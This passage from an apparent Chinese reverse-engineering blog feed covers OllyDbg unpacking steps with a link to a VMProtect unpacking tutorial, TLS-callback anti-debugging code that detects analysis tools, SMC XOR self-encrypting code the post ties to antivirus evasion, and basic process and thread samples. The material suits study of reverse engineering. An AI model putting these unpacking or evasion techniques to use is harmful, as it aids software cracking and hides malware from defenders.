alt=""><br>2、设置OD：选项-&gt;调试设置-&gt;事件-&gt;系统断点<br>3、将程序载入od,f9运行，便会来到一个call，(ctrl+g)搜索，VirtualProtect:<br><img src="https://i.imgur.com/GP0Voer.png" alt=""><br>4、接着便会来到一个地址，在这里下断点，继续f9,<br><img src="https://i.imgur.com/0qeQszn.png" alt=""><br>5、然后运行几次f9都会断到这里，NewProtect = READONLY且最后一次时(运行几次就知道啦，低位不会变)，此时alt+B，断点界面取消或禁用断点，然后alt+M，对text段下内存访问断点：<br><img src="https://i.imgur.com/xU4fNkV.png" alt=""><br>6、来到这里<br><img src="https://i.imgur.com/Qpgt36g.png" alt=""><br>7、(ctrl+g)搜索401000，硬件访问断点。运行，接着可以搜索特征码:EB0B85F375078BC6C1E0100BF0<br>8、这时就会找到OEP啦，可以直接dump出来，IDA可以看见算法啦，如果要运行，还需要IAT修复<br>这里分享一下vmp脱壳教程<br>链接: <a href="http://pan.baidu.com/s/1qWt14lA" target="_blank" rel="external">http://pan.baidu.com/s/1qWt14lA</a> 密码: 2wmq 解压密码：www.lthack.com</p><h2 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h2><p>衣带渐宽终不悔，<br>为伊消得人憔悴。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_绕过tls_与_smc保护</title>
    <link href="http://yoursite.com/2018/04/08/re_10_tls/"/>
    <id>http://yoursite.com/2018/04/08/re_10_tls/</id>
    <published>2018-04-08T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:54.476Z</updated>
    
    <content type="html"><![CDATA[<p>在main函数前，还有什么<br><a id="more"></a></p><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="1、何为tls"><a href="#1、何为tls" class="headerlink" title="1、何为tls"></a>1、何为tls</h2><p>TLS回调函数是指，每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP代码。</p><h2 id="2、编写tls函数"><a href="#2、编写tls函数" class="headerlink" title="2、编写tls函数"></a>2、编写tls函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">//使用tls 回调函数</span></div><div class="line"><span class="comment">//使用TLS 的宏</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/INCLUDE:__tls_used"</span>)</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">lookupprocess</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">PROCESSENTRY32 pe32;</div><div class="line">pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</div><div class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>); <span class="comment">// 在快照中包含系统中所有的进程</span></div><div class="line">BOOL bMore = Process32First(hProcessSnap, &amp;pe32); <span class="comment">// 获得第一个进程的句柄</span></div><div class="line"><span class="keyword">while</span> (bMore)</div><div class="line">&#123;</div><div class="line">_wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+<span class="number">1</span>);</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollyice.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////WARNING///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollydbg.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"peid.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ida.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"idaq.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line">bMore = Process32Next(hProcessSnap, &amp;pe32); <span class="comment">// 获取下一个进程的句柄</span></div><div class="line">&#125;</div><div class="line">CloseHandle(hProcessSnap);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Debugger</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</div><div class="line">__asm &#123;</div><div class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]<span class="comment">//TEB偏移30H处</span></div><div class="line">movzx eax, byte ptr ds:[eax + <span class="number">2</span>h]<span class="comment">//取PEB中BeingDebug，若为1则被调试</span></div><div class="line">mov result, eax</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (result) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID h, DWORD reason, PVOID pv)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">lookupprocess();</div><div class="line">Debugger();</div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Not_Main_this_is_tls!"</span>, <span class="string">L"tls"</span>, MB_OK);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">".CRT$XLB"</span>)</span></div><div class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, <span class="number">0</span> &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></div><div class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Main!"</span>, <span class="string">L"ESE"</span>, MB_OK);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="3、实践"><a href="#3、实践" class="headerlink" title="3、实践"></a>3、实践</h2><p>TLS callback函数的定义<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef VOID</div><div class="line">(NTAPI *PIMAGE_TLS_CALLBACK) (</div><div class="line">    PVOID DllHandle,     //模块句柄，即加载地址</div><div class="line">    DWORD Reason,        </div><div class="line">    PVOID Reserved</div><div class="line">    );</div><div class="line"></div><div class="line">其中reason有以下几种：(winNT.h)</div><div class="line"><span class="comment">#define DLL_PROCESS_ATTACH   1    进程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_ATTACH    2    线程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_DETACH    3    线程退出</span></div><div class="line"><span class="comment">#define DLL_PROCESS_DETACH   0    进程退出</span></div></pre></td></tr></table></figure></p><h2 id="3、手动去除TLS函数"><a href="#3、手动去除TLS函数" class="headerlink" title="3、手动去除TLS函数"></a>3、手动去除TLS函数</h2><p>例如：ida打开是这样的<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfix8jsj8j31750f2aah.jpg" alt=""><br>那就有TLS函数<br>1、OD去除TLS函数<br>OD运行，f9直接退出，因为会先执行TLS函数，这时需要设置成这样<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1flfj49nejej30r90ikq6b.jpg" alt=""><br>这就可以停在系统断点，可以看看tls函数做了什么，一般都是判断是否使用工具，ida,od，peid，如果有使用其中一种，程序直接退出，不会执行main函数<br>接着就一步一步的找TLS函数，找到直接把tls函数nop。<br>2、利用PEviewEXE和winhex去掉TLS函数<br>利用PEviewEXE查看PE文件的结构体,发现TLS结构体<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1flfjxsyhz4j316l0nh78k.jpg" alt=""><br>修改1<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfk389npmj30ny0eydhc.jpg" alt=""><br>修改为<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flfk4opm41j30lb0dqmy7.jpg" alt=""><br>修改2<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1flfk72dak1j315t0jq41a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1flfka5rrbkj30m40hhjse.jpg" alt=""><br>修改为<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flfkb8q07mj30jw0bi74m.jpg" alt=""><br>将修改后的文件另存为111.exe,ida打开<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfkdw89zvj30up0d4dgi.jpg" alt=""><br>这是已经去掉TLS函数了，收工</p><h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><p>SMC是一种局部代码加密技术，通过对一段代码进行加密来达到增加逆向工程难度或者免杀的目的。SMC 技术是病毒常用的技巧。SMC不仅能使用汇编上实现，还能很容易的使用VC实现，但是有一个比较致命缺陷：要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>需要一点点的PE结构基础就ok啦。加密需要一个加密函数，这里我用简单的xor函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//加密函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *start,<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) <span class="comment">//这里对地址进行简单的加密&gt;</span></div><div class="line">&#123;</div><div class="line">*(start+i) ^=<span class="number">0x88</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="编写SMC"><a href="#编写SMC" class="headerlink" title="编写SMC"></a>编写SMC</h2><p>所谓SMC（Self Modifying Code）技术,就是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程分序进行静态析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。<br>因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是SMC动态加密技术的精髓。 </p><h3 id="如何把敏感代码放入一个节表中？"><a href="#如何把敏感代码放入一个节表中？" class="headerlink" title="如何把敏感代码放入一个节表中？"></a>如何把敏感代码放入一个节表中？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></div></pre></td></tr></table></figure><p>将这句话放在开始程序的开始(也就是include下面)，主要是让text节区可以执行(E)读(R)写(W)分享(S)</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *start,<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) <span class="comment">//这里对地址进行简单的加密&gt;</span></div><div class="line">&#123;</div><div class="line">*(start+i) ^=<span class="number">0x88</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//需要保护的函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ck</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"this is a test of smc"</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">//加密数据结束的地址</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> *lp_s = <span class="number">0</span>;</div><div class="line"><span class="keyword">char</span> *lp_e = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">lp_s = (<span class="keyword">char</span> *)ck;  <span class="comment">//获取需要加密函数的起始地址</span></div><div class="line">lp_e = (<span class="keyword">char</span> *)end;  <span class="comment">//获取需要加密函数的结束地址</span></div><div class="line">len=lp_e-lp_s;</div><div class="line">enc(lp_s,len);      <span class="comment">//smc加密函数</span></div><div class="line">ck();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>现在，现在可以编译通过,生成test，但是无法运行，因为ck()函数的地址已经被打乱啦，这时候就利用OD进行修改，载入生成的程序，当程序运行enc()函数完成时，这时ck就已经完成加密啦，然后将程序dump下来test1。这时就可以运行啦。若拿<br>test去静态看时，完全看不懂ck的代码(这就进行smc加密啦)。</p><h2 id="解密SMC"><a href="#解密SMC" class="headerlink" title="解密SMC"></a>解密SMC</h2><p>1、找到smc的加密函数，当运行完成smc解密函数时,将程序dump下来。<br>2、smc对程序动态完全没有用，可以用OD来调试程序，找到受保护代码</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在main函数前，还有什么&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_线程与进程</title>
    <link href="http://yoursite.com/2018/04/05/re_9_thread_and_process/"/>
    <id>http://yoursite.com/2018/04/05/re_9_thread_and_process/</id>
    <published>2018-04-05T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:51.304Z</updated>
    
    <content type="html"><![CDATA[<p>进程与线程是最常用的方式<br><a id="more"></a></p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>创建一个线程的例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TCHAR szCommandLine[] = TEXT(<span class="string">"NOTEPAD"</span>);<span class="comment">//或者WCHAR</span></div><div class="line">    <span class="comment">//LPWSTR szCommandLine = TEXT("NOTEPAD");//错误</span></div><div class="line">    <span class="comment">//STARTUPINFO si = &#123; sizeof(si) &#125;;</span></div><div class="line">    STARTUPINFO si;</div><div class="line">    PROCESS_INFORMATION pi;</div><div class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</div><div class="line">    si.cb = <span class="keyword">sizeof</span>(si);</div><div class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</div><div class="line"> </div><div class="line">    si.dwFlags = STARTF_USESHOWWINDOW;  <span class="comment">// 指定wShowWindow成员有效</span></div><div class="line">    si.wShowWindow = TRUE;          <span class="comment">// 此成员设为TRUE的话则显示新建进程的主窗口，</span></div><div class="line">                        <span class="comment">// 为FALSE的话则不显示</span></div><div class="line">    BOOL bRet = ::CreateProcess (</div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 不在此指定可执行文件的文件名</span></div><div class="line">        szCommandLine,      <span class="comment">// 命令行参数</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 默认进程安全性</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 默认线程安全性</span></div><div class="line">        FALSE,          <span class="comment">// 指定当前进程内的句柄不可以被子进程继承</span></div><div class="line">        CREATE_NEW_CONSOLE, <span class="comment">// 为新进程创建一个新的控制台窗口</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 使用本进程的环境变量</span></div><div class="line">        <span class="literal">NULL</span>,           <span class="comment">// 使用本进程的驱动器和目录</span></div><div class="line">        &amp;si,</div><div class="line">        &amp;pi);</div><div class="line"> </div><div class="line">    <span class="keyword">if</span>(bRet)</div><div class="line">    &#123;</div><div class="line">        WaitForSingleObject(pi.hProcess, INFINITE);</div><div class="line">        <span class="comment">// 既然我们不使用两个句柄，最好是立刻将它们关闭</span></div><div class="line">        ::CloseHandle (pi.hThread);</div><div class="line">        ::CloseHandle (pi.hProcess);</div><div class="line"> </div><div class="line">        <span class="built_in">printf</span>(<span class="string">" 新进程的进程ID号：%d \n"</span>, pi.dwProcessId);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">" 新进程的主线程ID号：%d \n"</span>, pi.dwThreadId);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>fork是linux下创建进程，这里通过pipe来进行进程间的通讯(利用共享内存)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"> <span class="keyword">pid_t</span> pid;</div><div class="line"> <span class="keyword">if</span>(pipe(fd)&lt;<span class="number">0</span>)</div><div class="line"> &#123;</div><div class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">    <span class="keyword">if</span>((pid=fork())&lt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>( pid&gt;<span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">0</span>]);</div><div class="line">        write(fd[<span class="number">1</span>],<span class="string">"hello\n"</span>,<span class="number">6</span>);</div><div class="line">        wait(<span class="literal">NULL</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">1</span>]);</div><div class="line">        n=read(fd[<span class="number">0</span>],buff,<span class="number">128</span>);</div><div class="line">        write(STDOUT_FILENO,buff,n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><p>进程是资源分配的最小单位，而线程呢，则是CPU运行的最小单位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></div><div class="line">  </div><div class="line"><span class="comment">//线程函数  </span></div><div class="line"><span class="function">DWORD WINAPI <span class="title">printThread</span><span class="params">(LPVOID lpParameter)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)  </div><div class="line">    &#123;         </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"sub thread - %d\n"</span>,i+(<span class="keyword">int</span>)lpParameter);  </div><div class="line">        Sleep(<span class="number">500</span>);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])  </div><div class="line">&#123;  </div><div class="line">    <span class="comment">//创建一个线程，并让其挂起，不运行  </span></div><div class="line">    HANDLE hThread = CreateThread(<span class="number">0</span>, <span 